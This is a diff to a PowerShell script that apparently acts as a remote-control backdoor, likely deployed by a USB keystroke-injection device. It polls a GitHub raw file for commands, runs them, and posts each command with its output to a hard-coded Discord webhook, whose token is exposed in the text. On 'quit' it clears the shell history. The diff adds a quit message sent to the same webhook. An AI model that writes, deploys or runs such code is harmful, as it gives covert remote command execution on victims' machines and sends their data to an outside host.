@@ -1,5 +1,6 @@
 # Define the URL of the GitHub page
 $githubUrl = "https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/command.txt"
+$webhookUrl = "https://discord.com/api/webhooks/1354265213477851246/cuHgwA8xLpNhSWpr8A-nz8xnBnKHgG9BsSRrjq6-FV0zJIRYb0WAun4Vaj8INFZnpQQm"
 
 # Initialize a variable to store the output
 $output = ""
@@ -47,7 +48,7 @@ while ($true) {
             Write-Host $result
 
             # Post to Discord
-            $webhookUrl = "https://discord.com/api/webhooks/1354265213477851246/cuHgwA8xLpNhSWpr8A-nz8xnBnKHgG9BsSRrjq6-FV0zJIRYb0WAun4Vaj8INFZnpQQm"
+
             $Output = @{content = $command + "`n" + $result} | ConvertTo-Json -Depth 10
 			$maxLength = 1800
 
@@ -64,16 +65,14 @@ while ($true) {
 			}
 			
 			
-			
-			
-			
-
-            # Wait for 60 seconds before the next command
+            # Wait for 5 seconds before the next command
             Start-Sleep -Seconds 5
         }
 		
 		# Check if the command is 'quit' and exit the loop
         if ($command.Trim() -eq "quit") {
+			$Output = @{content = "QUIT COMMAND RECEIVED"} | ConvertTo-Json -Depth 10
+			Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $Output -ContentType "application/json"
             Write-Host "Quit command received. Exiting..."
             Invoke-Expression -Command Clear-History
             break
